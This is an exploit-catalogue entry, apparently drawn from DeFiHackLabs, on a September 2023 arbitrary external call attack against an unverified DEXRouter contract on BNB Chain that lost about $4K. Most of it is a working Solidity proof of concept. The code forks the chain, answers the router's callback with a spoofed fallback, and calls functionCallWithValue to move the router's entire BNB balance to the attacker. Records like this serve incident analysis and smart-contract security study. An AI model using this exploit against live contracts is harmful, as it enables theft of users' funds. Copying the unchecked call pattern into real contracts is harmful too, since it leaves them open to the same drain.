# [?] DEXRouter - Arbitrary External Call

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DEXRouter
Published: 2023-09-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/DEXRouter_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$4K
References:
- https://twitter.com/DecurityHQ/status/1707851321909428688

```solidity
contract ContractTest is Test {
    // Victim unverified contract. Name "DEXRouter" taken from parameter name in "go" function in attack contract
    IDEXRouter private constant DEXRouter = IDEXRouter(0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7);

    function setUp() public {
        vm.createSelectFork("bsc", 32_161_325);
        vm.label(address(DEXRouter), "DEXRouter");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        emit log_named_decimal_uint("Attacker BNB balance before exploit", address(this).balance, 18);
        // DEXRouter will call back to function with selector "0xe44a73b7". Look at fallback function
        DEXRouter.update(address(this), address(this), address(this), address(this));

        // Arbitrary external call vulnerability here. DEXRouter will call back "a" payable function and next transfer BNB to this contract
        DEXRouter.functionCallWithValue(address(this), abi.encodePacked(this.a.selector), address(DEXRouter).balance);

        emit log_named_decimal_uint("Attacker BNB balance after exploit", address(this).balance, 18);
    }

    function a() external payable returns (bool) {
        return true;
    }

    fallback(
        bytes calldata data
    ) external payable returns (bytes memory) {
        if (bytes4(data) == bytes4(0xe44a73b7)) {
            return abi.encode(true);
        }
    }
}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/DEXRouter_exp.sol_
